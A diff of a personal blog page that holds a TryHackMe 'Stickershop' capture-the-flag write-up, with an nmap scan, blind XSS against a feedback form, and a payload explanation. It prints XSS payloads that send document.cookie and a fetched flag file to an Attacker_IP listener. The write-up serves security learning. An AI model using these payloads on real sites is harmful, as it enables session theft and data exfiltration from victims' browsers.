@@ -1,398 +1,47 @@
-<!DOCTYPE html>
-<html lang="en" dir="auto">
-
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
-<title>THM: Stickershop CTF | 0kxwizard</title>
-<meta name="keywords" content="ctf, web security, THM, TryHackMe">
-<meta name="description" content="Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>THM: Stickershop CTF | 0kxwizard</title>
+<meta name=keywords content="ctf,web security,THM,TryHackMe"><meta name=description content="Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.
 Scanning Using nmap to scan the target:
-nmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.">
-<meta name="author" content="map[name:Kwesi Larry twitter:https://x.com/okxwizard]">
-<link rel="canonical" href="http://localhost:1313/writeups/stickershop/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.89edb6fe37780f84ba0c97f29ac0fdf58f3e5ebe4226a5027d8ba1442763be73.css" integrity="sha256-ie22/jd4D4S6DJfymsD99Y8&#43;Xr5CJqUCfYuhRCdjvnM=" rel="preload stylesheet" as="style"><script async src="https://www.googletagmanager.com/gtag/js?id=G-2SDDH3Z7G2"></script>
-
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', 'G-2SDDH3Z7G2');
-</script>
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/stickershop/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-</noscript>
-  
-
-<meta property="og:url" content="http://localhost:1313/writeups/stickershop/">
-  <meta property="og:site_name" content="0kxwizard">
-  <meta property="og:title" content="THM: Stickershop CTF">
-  <meta property="og:description" content="Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.
+nmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta name=author content="map[name:Kwesi Larry twitter:https://x.com/okxwizard]"><link rel=canonical href=https://kwesilarry1.github.io/writeups/stickershop/><link crossorigin=anonymous href=/assets/css/stylesheet.89edb6fe37780f84ba0c97f29ac0fdf58f3e5ebe4226a5027d8ba1442763be73.css integrity="sha256-ie22/jd4D4S6DJfymsD99Y8+Xr5CJqUCfYuhRCdjvnM=" rel="preload stylesheet" as=style><script async src="https://www.googletagmanager.com/gtag/js?id=G-2SDDH3Z7G2"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-2SDDH3Z7G2")</script><link rel=icon href=https://kwesilarry1.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://kwesilarry1.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://kwesilarry1.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://kwesilarry1.github.io/apple-touch-icon.png><link rel=mask-icon href=https://kwesilarry1.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://kwesilarry1.github.io/writeups/stickershop/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:url" content="https://kwesilarry1.github.io/writeups/stickershop/"><meta property="og:site_name" content="0kxwizard"><meta property="og:title" content="THM: Stickershop CTF"><meta property="og:description" content="Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.
 Scanning Using nmap to scan the target:
-nmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.">
-  <meta property="og:locale" content="en-us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2025-03-30T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-03-30T00:00:00+00:00">
-    <meta property="article:tag" content="Ctf">
-    <meta property="article:tag" content="Web Security">
-    <meta property="article:tag" content="THM">
-    <meta property="article:tag" content="TryHackMe">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="THM: Stickershop CTF">
-<meta name="twitter:description" content="Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.
+nmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2025-03-30T00:00:00+00:00"><meta property="article:modified_time" content="2025-03-30T00:00:00+00:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Web Security"><meta property="article:tag" content="THM"><meta property="article:tag" content="TryHackMe"><meta name=twitter:card content="summary"><meta name=twitter:title content="THM: Stickershop CTF"><meta name=twitter:description content="Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.
 Scanning Using nmap to scan the target:
-nmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Writeups",
-      "item": "http://localhost:1313/writeups/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "THM: Stickershop CTF",
-      "item": "http://localhost:1313/writeups/stickershop/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "THM: Stickershop CTF",
-  "name": "THM: Stickershop CTF",
-  "description": "Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.\nScanning Using nmap to scan the target:\nnmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.",
-  "keywords": [
-    "ctf", "web security", "THM", "TryHackMe"
-  ],
-  "articleBody": " Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.\nScanning Using nmap to scan the target:\nnmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA) | 256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA) |_ 256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519) 8080/tcp open http Werkzeug httpd 3.0.1 (Python 3.8.10) |_http-server-header: Werkzeug/3.0.1 Python/3.8.10 |_http-title: Cat Sticker Shop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds we found two open ports; 22(SSH) and 8080(http)\nEnumeration At http://stickershop.thm:8080/ we discover a cat sticker shop website. Clicking on the Feedback leads to http://stickershop.thm:8080/submit_feedback, a section for customer feedback. Tried to submit some feedback to see how the server treats the the comments and discovered the feedback is reviewed manually, likely in a staff browser or a vulnerable environment. XSS Exploitation to Obtain the flag This feedback form could be vulnerable to Cross Site Scripting specfically Blind.Let’s start with a test to confirm the avialability of XSS.We start our Netcat Listener and send the payload at http://stickershop.thm:8080/submit_feedback.\nAfter submitting the payload we get some responses on our web server, confirming the XSS vulnerability. We already know that the flag is at http://10.10.139.96:8080/flag.txt, so we can use a modified payload in order to receive it on our listener.\n'\"\u003e XSS Payload Explanation The payload starts with “\u003e to break out of an HTML attribute or tag, injecting malicious JavaScript into the webpage. The tag wraps the JavaScript code, enabling it to execute when the injected content is rendered by the victim’s browser. The fetch function sends a request to http://127.0.0.1:8080/flag.txt from the victim’s browser.If the victim’s browser has access to this local server, it will fetch the contents of flag.txt .then(response=\u003eresponse.text()) onverts the response (presumably text data) into a readable format. The script constructs a URL containing the extracted data and sends it to the attacker’s server (specified by \u003c-IP-Address\u003e:994) encodeURIComponent(data) ensures that special characters in the data are properly escaped, making the URL valid THANK YOU!\n",
-  "wordCount" : "408",
-  "inLanguage": "en",
-  "datePublished": "2025-03-30T00:00:00Z",
-  "dateModified": "2025-03-30T00:00:00Z",
-  "author":{
-    "@type": "Person",
-    "name": {"name":"Kwesi Larry","twitter":"https://x.com/okxwizard"}
-  },
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "http://localhost:1313/writeups/stickershop/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "0kxwizard",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "http://localhost:1313/favicon.ico"
-    }
-  }
-}
-</script>
-</head>
-
-<body class=" dark" id="top">
-
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="0kxwizard (Alt + H)">
-                <img src="https://i.imgur.com/AjsyTrs.jpeg" alt="" aria-label="logo"
-                    height="30">0kxwizard</a>
-            <div class="logo-switches">
-            </div>
-        </div>
-        <ul id="menu">
-            <li>
-                <a href="http://localhost:1313/" title="🏠 Home">
-                    <span>🏠 Home</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:1313/writeups" title="📝 Write-ups">
-                    <span>📝 Write-ups</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:1313/tags" title="🏷️ Tags">
-                    <span>🏷️ Tags</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:1313/projects" title="🛠️ Projects">
-                    <span>🛠️ Projects</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:1313/search" title="🔍 Search">
-                    <span>🔍 Search</span>
-                </a>
-            </li>
-            <li>
-                <a href="http://localhost:1313/about" title="👤 Whoami">
-                    <span>👤 Whoami</span>
-                </a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<main class="main">
-
-
-<article class="post-single">
-  <header class="post-header">
-    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a></div>
-    <h1 class="post-title entry-hint-parent">
-      THM: Stickershop CTF
-    </h1>
-    <div class="post-meta"><div class="post-meta">
-    <div class="meta-line">Posted <strong>March 30, 2025</strong> &nbsp;•&nbsp; <strong>2 min read</strong></div><div class="author-line">
-      By <a href="https://x.com/okxwizard" target="_blank" rel="noopener"><strong>Kwesi Larry</strong></a>
-    </div>
-</div>
-
-
-</div>
-  </header> <div class="toc">
-    <details >
-        <summary accesskey="c" title="(Alt + C)">
-            <span class="details">Table of Contents</span>
-        </summary>
-
-        <div class="inner"><nav id="TableOfContents">
-  <ul>
-    <li>
-      <ul>
-        <li><a href="#scanning">Scanning</a></li>
-        <li><a href="#enumeration">Enumeration</a></li>
-        <li><a href="#xss-exploitation-to-obtain-the-flag">XSS Exploitation to Obtain the flag</a></li>
-        <li><a href="#xss-payload-explanation">XSS Payload Explanation</a></li>
-      </ul>
-    </li>
-  </ul>
-</nav>
-        </div>
-    </details>
-</div>
-
-  <div class="post-content"><ul>
-<li>Platform: TryHackMe</li>
-<li>Link: <a href="http://localhost:1313/writeups/stickershop/">Stickershop</a></li>
-<li>Level: Easy</li>
-</ul>
-<hr>
-<p>To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.</p>
-<hr>
-<h3 id="scanning">Scanning<a hidden class="anchor" aria-hidden="true" href="#scanning">#</a></h3>
-<p>Using <code>nmap</code> to scan the target:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sV -sC Target_IP -OG The_Sticker_Shop
-</span></span></code></pre></div><h4 id="results">Results<a hidden class="anchor" aria-hidden="true" href="#results">#</a></h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-03-30 19:58 GMT
-</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.97.238
-</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.17s latency<span class="o">)</span>.
-</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
-</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
-</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 <span class="o">(</span>RSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 <span class="o">(</span>ECDSA<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 <span class="o">(</span>ED25519<span class="o">)</span>
-</span></span><span class="line"><span class="cl">8080/tcp open  http    Werkzeug httpd 3.0.1 <span class="o">(</span>Python 3.8.10<span class="o">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Werkzeug/3.0.1 Python/3.8.10
-</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Cat Sticker Shop
-</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 17.08 seconds
-</span></span></code></pre></div><p>we found two open ports; 22(SSH) and 8080(http)</p>
-<h3 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h3>
-<p>At <code>http://stickershop.thm:8080/</code> we discover a cat sticker shop website.
-<img alt="Alt text" loading="lazy" src="/images/home.png">
+nmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://kwesilarry1.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"THM: Stickershop CTF","item":"https://kwesilarry1.github.io/writeups/stickershop/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"THM: Stickershop CTF","name":"THM: Stickershop CTF","description":"Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.\nScanning Using nmap to scan the target:\nnmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.","keywords":["ctf","web security","THM","TryHackMe"],"articleBody":" Platform: TryHackMe Link: Stickershop Level: Easy To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.\nScanning Using nmap to scan the target:\nnmap -sV -sC Target_IP -OG The_Sticker_Shop Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 19:58 GMT Nmap scan report for 10.10.97.238 Host is up (0.17s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 (RSA) | 256 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 (ECDSA) |_ 256 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 (ED25519) 8080/tcp open http Werkzeug httpd 3.0.1 (Python 3.8.10) |_http-server-header: Werkzeug/3.0.1 Python/3.8.10 |_http-title: Cat Sticker Shop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds we found two open ports; 22(SSH) and 8080(http)\nEnumeration At http://stickershop.thm:8080/ we discover a cat sticker shop website. Clicking on the Feedback leads to http://stickershop.thm:8080/submit_feedback, a section for customer feedback. Tried to submit some feedback to see how the server treats the the comments and discovered the feedback is reviewed manually, likely in a staff browser or a vulnerable environment. XSS Exploitation to Obtain the flag This feedback form could be vulnerable to Cross Site Scripting specfically Blind.Let’s start with a test to confirm the avialability of XSS.We start our Netcat Listener and send the payload at http://stickershop.thm:8080/submit_feedback.\nAfter submitting the payload we get some responses on our web server, confirming the XSS vulnerability. We already know that the flag is at http://10.10.139.96:8080/flag.txt, so we can use a modified payload in order to receive it on our listener.\n'\"\u003e XSS Payload Explanation The payload starts with “\u003e to break out of an HTML attribute or tag, injecting malicious JavaScript into the webpage. The tag wraps the JavaScript code, enabling it to execute when the injected content is rendered by the victim’s browser. The fetch function sends a request to http://127.0.0.1:8080/flag.txt from the victim’s browser.If the victim’s browser has access to this local server, it will fetch the contents of flag.txt .then(response=\u003eresponse.text()) onverts the response (presumably text data) into a readable format. The script constructs a URL containing the extracted data and sends it to the attacker’s server (specified by \u003c-IP-Address\u003e:994) encodeURIComponent(data) ensures that special characters in the data are properly escaped, making the URL valid THANK YOU!\n","wordCount":"408","inLanguage":"en","datePublished":"2025-03-30T00:00:00Z","dateModified":"2025-03-30T00:00:00Z","author":{"@type":"Person","name":{"name":"Kwesi Larry","twitter":"https://x.com/okxwizard"}},"mainEntityOfPage":{"@type":"WebPage","@id":"https://kwesilarry1.github.io/writeups/stickershop/"},"publisher":{"@type":"Organization","name":"0kxwizard","logo":{"@type":"ImageObject","url":"https://kwesilarry1.github.io/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://kwesilarry1.github.io/ accesskey=h title="0kxwizard (Alt + H)"><img src=https://i.imgur.com/AjsyTrs.jpeg alt aria-label=logo height=30>0kxwizard</a><div class=logo-switches></div></div><ul id=menu><li><a href=https://kwesilarry1.github.io/ title="🏠 Home"><span>🏠 Home</span></a></li><li><a href=https://kwesilarry1.github.io/writeups title="📝 Write-ups"><span>📝 Write-ups</span></a></li><li><a href=https://kwesilarry1.github.io/tags title="🏷️ Tags"><span>🏷️ Tags</span></a></li><li><a href=https://kwesilarry1.github.io/projects title="🛠️ Projects"><span>🛠️ Projects</span></a></li><li><a href=https://kwesilarry1.github.io/search title="🔍 Search"><span>🔍 Search</span></a></li><li><a href=https://kwesilarry1.github.io/about title="👤 Whoami"><span>👤 Whoami</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://kwesilarry1.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://kwesilarry1.github.io/writeups/>Writeups</a></div><h1 class="post-title entry-hint-parent">THM: Stickershop CTF</h1><div class=post-meta><div class=post-meta><div class=meta-line>Posted <strong>March 30, 2025</strong> &nbsp;•&nbsp; <strong>2 min read</strong></div><div class=author-line>By <a href=https://x.com/okxwizard target=_blank rel=noopener><strong>Kwesi Larry</strong></a></div></div></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><ul><li><a href=#scanning>Scanning</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#xss-exploitation-to-obtain-the-flag>XSS Exploitation to Obtain the flag</a></li><li><a href=#xss-payload-explanation>XSS Payload Explanation</a></li></ul></li></ul></nav></div></details></div><div class=post-content><ul><li>Platform: TryHackMe</li><li>Link: <a href=http://localhost:1313/writeups/stickershop/>Stickershop</a></li><li>Level: Easy</li></ul><hr><p>To read the flag in this very simple room, we must take advantage of a Cross-Site Scripting vulnerability.</p><hr><h3 id=scanning>Scanning<a hidden class=anchor aria-hidden=true href=#scanning>#</a></h3><p>Using <code>nmap</code> to scan the target:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -sV -sC Target_IP -OG The_Sticker_Shop
+</span></span></code></pre></div><h4 id=results>Results<a hidden class=anchor aria-hidden=true href=#results>#</a></h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Starting Nmap 7.95 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2025-03-30 19:58 GMT
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.97.238
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.17s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> b2:54:8c:e2:d7:67:ab:8f:90:b3:6f:52:c2:73:37:69 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 14:29:ec:36:95:e5:64:49:39:3f:b4:ec:ca:5f:ee:78 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 19:eb:1f:c9:67:92:01:61:0c:14:fe:71:4b:0d:50:40 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>8080/tcp open  http    Werkzeug httpd 3.0.1 <span class=o>(</span>Python 3.8.10<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Werkzeug/3.0.1 Python/3.8.10
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Cat Sticker Shop
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 17.08 seconds
+</span></span></code></pre></div><p>we found two open ports; 22(SSH) and 8080(http)</p><h3 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h3><p>At <code>http://stickershop.thm:8080/</code> we discover a cat sticker shop website.
+<img alt="Alt text" loading=lazy src=/images/home.png>
 Clicking on the Feedback leads to <code>http://stickershop.thm:8080/submit_feedback</code>, a section for customer feedback.
-<img alt="Feedback" loading="lazy" src="/images/feedback.png">
+<img alt=Feedback loading=lazy src=/images/feedback.png>
 Tried to submit some feedback to see how the server treats the the comments and discovered the feedback is reviewed manually, likely in a staff browser or a vulnerable environment.
-<img alt="response" loading="lazy" src="/images/response.png"></p>
-<h3 id="xss-exploitation-to-obtain-the-flag">XSS Exploitation to Obtain the flag<a hidden class="anchor" aria-hidden="true" href="#xss-exploitation-to-obtain-the-flag">#</a></h3>
-<p>This feedback form could be vulnerable to Cross Site Scripting specfically Blind.Let&rsquo;s start with a test to confirm the avialability of XSS.We start our <code>Netcat Listener</code> and send the payload at <code>http://stickershop.thm:8080/submit_feedback</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&lt;script&gt;document.location<span class="o">=</span><span class="s1">&#39;http://Attacker_IP:8080/?cookie=&#39;</span>+document.cookie<span class="p">;</span>&lt;/script&gt;
-</span></span></code></pre></div><p><img alt="testing XSS" loading="lazy" src="/images/test1.png">
+<img alt=response loading=lazy src=/images/response.png></p><h3 id=xss-exploitation-to-obtain-the-flag>XSS Exploitation to Obtain the flag<a hidden class=anchor aria-hidden=true href=#xss-exploitation-to-obtain-the-flag>#</a></h3><p>This feedback form could be vulnerable to Cross Site Scripting specfically Blind.Let&rsquo;s start with a test to confirm the avialability of XSS.We start our <code>Netcat Listener</code> and send the payload at <code>http://stickershop.thm:8080/submit_feedback</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>&lt;script&gt;document.location<span class=o>=</span><span class=s1>&#39;http://Attacker_IP:8080/?cookie=&#39;</span>+document.cookie<span class=p>;</span>&lt;/script&gt;
+</span></span></code></pre></div><p><img alt="testing XSS" loading=lazy src=/images/test1.png>
 After submitting the payload we get some responses on our web server, confirming the XSS vulnerability.
-<img alt="testing XSS" loading="lazy" src="/images/test2.png">
-We already know that the flag is at <code>http://10.10.139.96:8080/flag.txt</code>, so we can use a modified payload in order to receive it on our listener.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s1">&#39;&#34;&gt;&lt;script&gt;
-</span></span></span><span class="line"><span class="cl"><span class="s1">fetch(&#39;</span>http://127.0.0.1:8080/flag.txt<span class="s1">&#39;)
-</span></span></span><span class="line"><span class="cl"><span class="s1">.then(response =&gt; response.text())
-</span></span></span><span class="line"><span class="cl"><span class="s1">.then(data =&gt; {
-</span></span></span><span class="line"><span class="cl"><span class="s1">fetch(&#39;</span>http://Attacker_IP:994/?flag<span class="o">=</span><span class="err">&#39;</span> + encodeURIComponent<span class="o">(</span>data<span class="o">))</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="o">})</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">&lt;/script&gt;
-</span></span></code></pre></div><p><img alt="XSS" loading="lazy" src="/images/xss.png">
-<img alt="flag" loading="lazy" src="/images/flag.png"></p>
-<hr>
-<h3 id="xss-payload-explanation">XSS Payload Explanation<a hidden class="anchor" aria-hidden="true" href="#xss-payload-explanation">#</a></h3>
-<ul>
-<li>The payload starts with &ldquo;&gt; to break out of an HTML attribute or tag, injecting malicious JavaScript into the webpage.</li>
-<li>The <!-- raw HTML omitted --> tag wraps the JavaScript code, enabling it to execute when the injected content is rendered by the victim&rsquo;s browser.</li>
